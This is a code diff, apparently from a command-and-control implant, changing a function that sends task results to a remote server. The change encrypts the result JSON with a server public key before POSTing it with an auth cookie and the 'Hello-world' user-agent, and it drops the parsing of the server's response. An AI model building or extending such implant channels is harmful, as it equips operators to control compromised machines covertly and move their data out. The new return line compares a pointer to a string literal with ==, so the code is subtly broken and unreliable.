@@ -104,19 +104,13 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
     statusVal.SetBool(success);
     resultsDocument.AddMember("status", statusVal, resultsDocument.GetAllocator());
 
-    // resultsDocument.SetObject();
-    // rapidjson::Document::AllocatorType &allocator = resultsDocument.GetAllocator();
-    // rapidjson::Value resultsVal(resultsB64.c_str(), allocator);
-    // resultsDocument.AddMember("output", resultsVal, allocator);
-    // rapidjson::Value tidVal(taskId, allocator);
-    // resultsDocument.AddMember("tid", tidVal, allocator);
-    // rapidjson::Value statusVal(success, allocator);
-    // resultsDocument.AddMember("status", statusVal, allocator);
-
     rapidjson::StringBuffer buffer;
     rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
     resultsDocument.Accept(writer);
     const char *results_json = buffer.GetString();
+
+    // Encrypt the results
+    string encryptedResults = encryptB64String(profile->base64ServerPublicKey, profile->base64EncryptionKey, results_json);
 
     DEBUG_PRINTF("Results JSON: %s\n", results_json);
 
@@ -128,26 +122,10 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
 
     // Send the results
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
+    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, FALSE);
     
     DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
 
-    // Parse JSON response
-    rapidjson::Document resDocument;
-    resDocument.Parse(res.c_str());
-
-    if (resDocument.HasParseError())
-    {
-        DEBUG_PRINTF("Error parsing JSON response\n");
-        return false;
-    }
-
-    if (!resDocument["status"].GetBool())
-    {
-        DEBUG_PRINTF("Error sending task results\n");
-        return false;
-    }
-
-    return true;
+    return res.c_str() == "OK";
 
 }
